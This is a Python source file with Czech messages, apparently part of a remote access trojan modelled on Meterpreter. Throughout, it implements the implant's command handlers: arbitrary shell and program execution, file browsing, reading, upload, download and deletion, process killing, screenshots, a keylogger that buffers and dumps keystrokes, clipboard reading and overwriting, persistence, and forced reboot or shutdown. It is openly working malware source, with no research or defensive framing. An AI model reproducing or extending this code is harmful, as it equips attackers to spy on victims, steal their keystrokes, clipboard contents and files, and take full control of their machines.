# rat/meterpreter.py
import os
import platform
import shutil
import socket
import subprocess
import threading
import time

from rat.base import RemoteAccessTool

try:
    from pynput import keyboard
    PYNPUT = True
except ImportError:
    PYNPUT = False

try:
    import win32clipboard
    WIN32CLIP = True
except ImportError:
    WIN32CLIP = False


class MeterpreterRAT(RemoteAccessTool):

    def __init__(self, config):
        super().__init__(config)
        self._keylogger_running = False
        self._keylogger_buffer = []
        self._keylogger_lock = threading.Lock()
        self._listener = None

        # dispatch table - jeden zdroj pravdy
        self._handlers = {
            "sysinfo":       self._cmd_sysinfo,
            "ps":            self._cmd_ps,
            "kill":          self._cmd_kill,
            "getpid":        self._cmd_getpid,
            "pwd":           self._cmd_pwd,
            "ls":            self._cmd_ls,
            "dir":           self._cmd_ls,
            "cd":            self._cmd_cd,
            "cat":           self._cmd_cat,
            "type":          self._cmd_cat,
            "download":      self._cmd_download,
            "upload":        self._cmd_upload,
            "rm":            self._cmd_rm,
            "del":           self._cmd_rm,
            "shell":         self._cmd_shell,
            "execute":       self._cmd_execute,
            "screenshot":    self._cmd_screenshot,
            "keyscan_start": self._cmd_keyscan_start,
            "keyscan_stop":  self._cmd_keyscan_stop,
            "keyscan_dump":  self._cmd_keyscan_dump,
            "keyscan_clear": self._cmd_keyscan_clear,
            "clipboard_get": self._cmd_clipboard_get,
            "clipboard_set": self._cmd_clipboard_set,
            "persistence":   self._cmd_persistence,
            "ipconfig":      self._cmd_ipconfig,
            "reboot":        self._cmd_reboot,
            "shutdown":      self._cmd_shutdown,
            "kill_session":  self._cmd_kill_session,
        }

    # ---------- dispatcher ----------

    def execute_command(self, cmd):
        cmd_type = cmd.get("type")
        handler = self._handlers.get(cmd_type)
        if not handler:
            return {"error": f"neznamy prikaz: {cmd_type}"}
        return handler(cmd)

    # ---------- core ----------

    def _cmd_sysinfo(self, cmd):
        return self.get_system_info()

    def _cmd_getpid(self, cmd):
        return {"pid": os.getpid()}

    def _cmd_pwd(self, cmd):
        return {"cwd": os.getcwd()}

    def _cmd_kill(self, cmd):
        pid = cmd.get("pid")
        if not pid:
            return {"error": "chybi pid"}
        try:
            if platform.system() == "Windows":
                subprocess.run(["taskkill", "/PID", str(pid), "/F"],
                               capture_output=True, check=True)
            else:
                subprocess.run(["kill", "-9", str(pid)], check=True)
            return {"status": f"killed {pid}"}
        except subprocess.CalledProcessError as e:
            return {"error": str(e)}

    # ---------- filesystem ----------

    def _cmd_ls(self, cmd):
        path = cmd.get("path", ".")
        if not os.path.exists(path):
            return {"error": f"nenalezeno: {path}"}
        items = []
        for name in os.listdir(path):
            full = os.path.join(path, name)
            try:
                st = os.stat(full)
                items.append({
                    "name": name,
                    "type": "dir" if os.path.isdir(full) else "file",
                    "size": st.st_size,
                    "modified": st.st_mtime,
                })
            except OSError:
                items.append({"name": name, "type": "unknown", "size": 0, "modified": 0})
        return {"path": path, "items": items}

    def _cmd_cd(self, cmd):
        path = cmd.get("path")
        if not path:
            return {"error": "chybi path"}
        try:
            os.chdir(path)
            return {"cwd": os.getcwd()}
        except OSError as e:
            return {"error": str(e)}

    def _cmd_cat(self, cmd):
        path = cmd.get("path")
        if not path:
            return {"error": "chybi path"}
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read(10000)
        except OSError as e:
            return {"error": str(e)}
        return {"path": path, "content": content, "truncated": len(content) == 10000}

    def _cmd_download(self, cmd):
        rpath = cmd.get("rpath")
        if not rpath:
            return {"error": "chybi rpath"}
        return self.download_file(rpath)

    def _cmd_upload(self, cmd):
        rpath = cmd.get("rpath")
        content = cmd.get("content")
        if not rpath or content is None:
            return {"error": "chybi rpath nebo content"}
        return self.upload_file(rpath, content)

    def _cmd_rm(self, cmd):
        path = cmd.get("path")
        if not path:
            return {"error": "chybi path"}
        try:
            os.remove(path)
            return {"status": f"smazano: {path}"}
        except OSError as e:
            return {"error": str(e)}

    # ---------- execution ----------

    def _cmd_shell(self, cmd):
        command = cmd.get("command")
        if not command:
            return {"error": "chybi command"}
        return self.execute_shell(command)

    def _cmd_execute(self, cmd):
        path = cmd.get("path")
        if not path:
            return {"error": "chybi path"}
        args = cmd.get("args", "")
        try:
            r = subprocess.run(
                f'"{path}" {args}'.strip(),
                shell=True, capture_output=True, text=True, timeout=30,
            )
            return {"stdout": r.stdout, "stderr": r.stderr, "returncode": r.returncode}
        except subprocess.TimeoutExpired:
            return {"error": "timeout"}

    # ---------- screenshot ----------

    def _cmd_screenshot(self, cmd):
        return self.take_screenshot()

    # ---------- process list ----------

    def _cmd_ps(self, cmd):
        if platform.system() == "Windows":
            return {"processes": self._ps_windows()}
        return {"processes": self._ps_unix()}

    def _ps_windows(self):
        out = subprocess.check_output(
            ["tasklist", "/FO", "CSV", "/NH"], text=True
        )
        procs = []
        for line in out.splitlines():
            parts = line.strip('"').split('","')
            if len(parts) >= 5:
                procs.append({
                    "name": parts[0],
                    "pid": int(parts[1]),
                    "session": parts[2],
                    "memory": parts[4],
                })
        return procs

    def _ps_unix(self):
        out = subprocess.check_output(["ps", "aux"], text=True)
        procs = []
        for line in out.splitlines()[1:]:
            parts = line.split(None, 10)
            if len(parts) >= 11:
                procs.append({
                    "user": parts[0],
                    "pid": int(parts[1]),
                    "cpu": parts[2],
                    "mem": parts[3],
                    "command": parts[10][:80],
                })
        return procs

    # ---------- keylogger ----------

    def _cmd_keyscan_start(self, cmd):
        if not PYNPUT:
            return {"error": "pynput neni nainstalovany (pip install pynput)"}
        if self._keylogger_running:
            return {"status": "uz bezi"}

        self._keylogger_running = True
        with self._keylogger_lock:
            self._keylogger_buffer.clear()

        def on_press(key):
            if not self._keylogger_running:
                return
            try:
                char = key.char
            except AttributeError:
                char = f"[{key.name.upper()}]"
            with self._keylogger_lock:
                self._keylogger_buffer.append({"key": char, "time": time.time()})

        self._listener = keyboard.Listener(on_press=on_press)
        self._listener.start()
        return {"status": "keylogger spusten"}

    def _cmd_keyscan_stop(self, cmd):
        if not self._keylogger_running:
            return {"status": "nebezi"}
        self._keylogger_running = False
        if self._listener:
            self._listener.stop()
            self._listener = None
        with self._keylogger_lock:
            count = len(self._keylogger_buffer)
        return {"status": "zastaven", "keys_captured": count}

    def _cmd_keyscan_dump(self, cmd):
        with self._keylogger_lock:
            buf = list(self._keylogger_buffer)
        if not buf:
            return {"status": "zadne klavesy"}
        text = "".join(e["key"] for e in buf[-1000:])
        return {"keystrokes": text, "count": len(buf)}

    def _cmd_keyscan_clear(self, cmd):
        with self._keylogger_lock:
            self._keylogger_buffer.clear()
        return {"status": "buffer vymazan"}

    # ---------- clipboard ----------

    def _cmd_clipboard_get(self, cmd):
        if not WIN32CLIP:
            return {"error": "win32clipboard neni dostupny"}
        try:
            win32clipboard.OpenClipboard()
            try:
                data = win32clipboard.GetClipboardData()
            finally:
                win32clipboard.CloseClipboard()
            return {"clipboard": data}
        except Exception as e:
            return {"error": str(e)}

    def _cmd_clipboard_set(self, cmd):
        if not WIN32CLIP:
            return {"error": "win32clipboard neni dostupny"}
        text = cmd.get("text", "")
        try:
            win32clipboard.OpenClipboard()
            try:
                win32clipboard.EmptyClipboard()
                win32clipboard.SetClipboardText(text)
            finally:
                win32clipboard.CloseClipboard()
            return {"status": "clipboard nastaven"}
        except Exception as e:
            return {"error": str(e)}

    # ---------- network / system ----------

    def _cmd_persistence(self, cmd):
        return self.set_persistence(cmd.get("enable", False))

    def _cmd_ipconfig(self, cmd):
        try:
            if platform.system() == "Windows":
                r = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True)
            else:
                r = subprocess.run(["ifconfig", "-a"], capture_output=True, text=True)
            return {"output": r.stdout}
        except OSError as e:
            return {"error": str(e)}

    def _cmd_reboot(self, cmd):
        try:
            if platform.system() == "Windows":
                subprocess.run(["shutdown", "/r", "/t", "0"], check=False)
            else:
                subprocess.run(["reboot"], check=False)
            return {"status": "rebootuji..."}
        except OSError as e:
            return {"error": str(e)}

    def _cmd_shutdown(self, cmd):
        try:
            if platform.system() == "Windows":
                subprocess.run(["shutdown", "/s", "/t", "0"], check=False)
            else:
                subprocess.run(["poweroff"], check=False)
            return {"status": "vypinam..."}
        except OSError as e:
            return {"error": str(e)}

    def _cmd_kill_session(self, cmd):
        self.running = False
        return {"status": "session konci"}